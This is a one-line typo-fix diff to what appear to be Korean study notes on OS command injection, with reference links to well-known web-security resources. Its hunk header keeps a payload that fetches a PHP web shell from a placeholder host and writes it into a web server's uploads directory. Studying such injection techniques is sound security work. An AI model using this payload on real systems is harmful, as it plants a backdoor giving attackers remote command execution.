@@ -411,7 +411,7 @@ http://test.com?cmd=<?%3Dsystem($_GET[cmd]);?> -o /var/www/html/uploads/webshell
 | env, export | set       | 환경변수 설정         |
 
 
-# Referance
+# Reference
 1. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection
 2. https://www.bugbountyclub.com/pentestgym/view/58
 3. https://portswigger.net/web-security/os-command-injection
